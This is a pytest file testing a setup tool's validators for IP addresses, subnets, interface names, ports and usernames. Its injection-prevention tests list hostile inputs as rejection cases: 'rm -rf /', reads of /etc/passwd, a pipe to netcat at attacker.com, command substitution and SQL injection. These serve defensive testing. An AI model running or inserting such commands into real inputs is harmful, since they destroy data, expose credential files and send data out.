"""
Unit tests for input validation functions in setup.py.

These tests ensure that all user input validation functions correctly
identify valid and invalid inputs, preventing injection attacks and
configuration errors.
"""

import pytest
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from setup import SetupConfig


class TestIPValidation:
    """Tests for IP address validation."""

    @pytest.fixture
    def config(self):
        """Create SetupConfig instance for testing."""
        return SetupConfig()

    def test_valid_ipv4_addresses(self, config):
        """Test that valid IPv4 addresses are accepted."""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "255.255.255.255",
            "0.0.0.0",
            "127.0.0.1",
            "8.8.8.8",
        ]
        for ip in valid_ips:
            assert config.validate_ip(ip), f"Valid IP rejected: {ip}"

    def test_invalid_ipv4_addresses(self, config):
        """Test that invalid IPv4 addresses are rejected."""
        invalid_ips = [
            "256.1.1.1",  # Octet > 255
            "192.168.1",  # Missing octet
            "192.168.1.1.1",  # Too many octets
            "192.168.-1.1",  # Negative octet
            "192.168.1.a",  # Non-numeric octet
            "192.168.1.1/24",  # CIDR notation (should use validate_subnet)
            "localhost",  # Hostname
            "",  # Empty string
            "999.999.999.999",  # All octets > 255
        ]
        for ip in invalid_ips:
            assert not config.validate_ip(ip), f"Invalid IP accepted: {ip}"

    def test_edge_case_ips(self, config):
        """Test edge case IP addresses."""
        edge_cases = [
            ("0.0.0.0", True),  # All zeros - valid
            ("255.255.255.255", True),  # All max - valid
            ("192.168.001.001", True),  # Leading zeros - valid (Python ipaddress accepts)
        ]
        for ip, expected in edge_cases:
            result = config.validate_ip(ip)
            assert result == expected, f"IP {ip} validation failed (expected {expected}, got {result})"


class TestSubnetValidation:
    """Tests for subnet validation."""

    @pytest.fixture
    def config(self):
        return SetupConfig()

    def test_valid_subnets(self, config):
        """Test valid IP/netmask combinations."""
        valid_subnets = [
            ("192.168.1.0", "24"),
            ("10.0.0.0", "8"),
            ("172.16.0.0", "12"),
            ("192.168.1.0", "255.255.255.0"),
            ("10.10.100.0", "24"),
        ]
        for ip, netmask in valid_subnets:
            assert config.validate_subnet(ip, netmask), f"Valid subnet rejected: {ip}/{netmask}"

    def test_invalid_subnets(self, config):
        """Test invalid IP/netmask combinations."""
        invalid_subnets = [
            ("192.168.1.1", "33"),  # Netmask > 32
            ("192.168.1.1", "-1"),  # Negative netmask
            ("256.1.1.1", "24"),  # Invalid IP
            ("192.168.1.1", "abc"),  # Non-numeric netmask
            ("192.168.1.1", ""),  # Empty netmask
        ]
        for ip, netmask in invalid_subnets:
            assert not config.validate_subnet(ip, netmask), f"Invalid subnet accepted: {ip}/{netmask}"


class TestInterfaceNameValidation:
    """Tests for network interface name validation."""

    @pytest.fixture
    def config(self):
        return SetupConfig()

    def test_valid_interface_names(self, config):
        """Test valid network interface names."""
        valid_interfaces = [
            "eth0",
            "eth1",
            "ens18",
            "ens192",
            "enp0s3",
            "wlan0",
            "br0",
            "vmbr0",
            "lo",
            "docker0",
            "eth0.100",  # VLAN interface
            "bond0",
            "team0",
        ]
        for interface in valid_interfaces:
            assert config.validate_interface_name(interface), f"Valid interface rejected: {interface}"

    def test_invalid_interface_names(self, config):
        """Test invalid interface names (potential injection vectors)."""
        invalid_interfaces = [
            "",  # Empty string
            "eth0; rm -rf /",  # Command injection attempt
            "eth0 && malicious",  # Command chaining
            "eth0|nc",  # Pipe attempt
            "eth0`whoami`",  # Command substitution
            "eth0$(whoami)",  # Command substitution
            "../../../etc/passwd",  # Path traversal
            "eth0\nmalicious",  # Newline injection
            "eth0\rmalicious",  # Carriage return injection
            "a" * 16,  # Too long (>15 chars)
            "eth 0",  # Space in name
            "eth@0",  # Invalid character @
            "eth#0",  # Invalid character #
            "eth$0",  # Invalid character $
        ]
        for interface in invalid_interfaces:
            assert not config.validate_interface_name(interface), f"Invalid interface accepted: {interface}"

    def test_interface_name_length_limits(self, config):
        """Test interface name length boundaries."""
        assert config.validate_interface_name("a"), "Single char rejected"
        assert config.validate_interface_name("a" * 15), "15 char interface rejected"
        assert not config.validate_interface_name("a" * 16), "16 char interface accepted"


class TestPortValidation:
    """Tests for port number validation."""

    @pytest.fixture
    def config(self):
        return SetupConfig()

    def test_valid_ports(self, config):
        """Test valid port numbers."""
        valid_ports = [
            1,  # Minimum valid port
            22,  # SSH
            80,  # HTTP
            443,  # HTTPS
            8080,  # Alternative HTTP
            65535,  # Maximum valid port
        ]
        for port in valid_ports:
            assert config.validate_port(port), f"Valid port rejected: {port}"
            assert config.validate_port(str(port)), f"Valid port string rejected: {port}"

    def test_invalid_ports(self, config):
        """Test invalid port numbers."""
        invalid_ports = [
            0,  # Too low
            -1,  # Negative
            65536,  # Too high
            99999,  # Way too high
            "abc",  # Non-numeric
            "",  # Empty string
            None,  # None type
            3.14,  # Float (should fail or truncate)
        ]
        for port in invalid_ports:
            assert not config.validate_port(port), f"Invalid port accepted: {port}"

    def test_port_edge_cases(self, config):
        """Test port number edge cases."""
        assert config.validate_port(1), "Port 1 rejected"
        assert config.validate_port(65535), "Port 65535 rejected"
        assert not config.validate_port(0), "Port 0 accepted"
        assert not config.validate_port(65536), "Port 65536 accepted"


class TestUsernameValidation:
    """Tests for username validation."""

    @pytest.fixture
    def config(self):
        return SetupConfig()

    def test_valid_usernames(self, config):
        """Test valid SSH usernames."""
        valid_usernames = [
            "root",
            "admin",
            "user123",
            "pi-hole",
            "john.doe",
            "user_name",
            "service-account",
            "a",  # Single character
            "a" * 32,  # Maximum length (32)
        ]
        for username in valid_usernames:
            assert config.validate_username(username), f"Valid username rejected: {username}"

    def test_invalid_usernames(self, config):
        """Test invalid usernames (potential injection vectors)."""
        invalid_usernames = [
            "",  # Empty string
            "root; whoami",  # Command injection
            "admin && ls",  # Command chaining
            "user|nc",  # Pipe attempt
            "user`whoami`",  # Command substitution
            "user$(id)",  # Command substitution
            "user@host",  # Email-like format (@ not allowed)
            "user name",  # Space in username
            "user#1",  # Hash character
            "user$var",  # Dollar sign
            "../../../etc/passwd",  # Path traversal
            "user\nmalicious",  # Newline injection
            "a" * 33,  # Too long (>32 chars)
        ]
        for username in invalid_usernames:
            assert not config.validate_username(username), f"Invalid username accepted: {username}"

    def test_username_length_limits(self, config):
        """Test username length boundaries."""
        assert config.validate_username("a"), "Single char username rejected"
        assert config.validate_username("a" * 32), "32 char username rejected"
        assert not config.validate_username("a" * 33), "33 char username accepted"
        assert not config.validate_username(""), "Empty username accepted"


class TestSanitizeInput:
    """Tests for input sanitization function."""

    @pytest.fixture
    def config(self):
        return SetupConfig()

    def test_clean_input_unchanged(self, config):
        """Test that clean input passes through unchanged."""
        clean_inputs = [
            "simple_text",
            "192.168.1.1",
            "eth0",
            "user-name",
            "file.txt",
        ]
        for text in clean_inputs:
            sanitized = config.sanitize_input(text)
            assert sanitized == text, f"Clean input was modified: {text} -> {sanitized}"

    def test_dangerous_characters_removed(self, config):
        """Test that dangerous characters are removed or handled."""
        # Note: Implementation details may vary, adjust based on actual sanitize_input behavior
        dangerous_inputs = [
            ("hello;world", "hello world"),  # Semicolon removed
            ("user&&admin", "user admin"),  # && removed
            ("test|pipe", "test pipe"),  # Pipe removed
        ]
        for input_text, expected_pattern in dangerous_inputs:
            sanitized = config.sanitize_input(input_text)
            assert sanitized is not None, f"Sanitization failed for: {input_text}"
            # Note: Exact behavior depends on implementation


class TestSecurityInjectionPrevention:
    """
    Security-focused tests to ensure validation prevents injection attacks.

    These tests specifically target common attack vectors like command injection,
    SQL injection, and path traversal attempts.
    """

    @pytest.fixture
    def config(self):
        return SetupConfig()

    @pytest.mark.parametrize("malicious_input", [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 1234",
        "`whoami`",
        "$(id)",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "\n/bin/bash",
        "\r\nmalicious",
    ])
    def test_interface_injection_prevention(self, config, malicious_input):
        """Test that malicious interface names are rejected."""
        # Try as standalone
        assert not config.validate_interface_name(malicious_input), \
            f"Malicious input accepted: {malicious_input}"

        # Try prepended to valid interface
        assert not config.validate_interface_name(f"eth0{malicious_input}"), \
            f"Malicious suffix accepted: eth0{malicious_input}"

    @pytest.mark.parametrize("malicious_input", [
        "root; whoami",
        "admin && ls",
        "user|bash",
        "user`id`",
        "user$(cat /etc/passwd)",
    ])
    def test_username_injection_prevention(self, config, malicious_input):
        """Test that malicious usernames are rejected."""
        assert not config.validate_username(malicious_input), \
            f"Malicious username accepted: {malicious_input}"
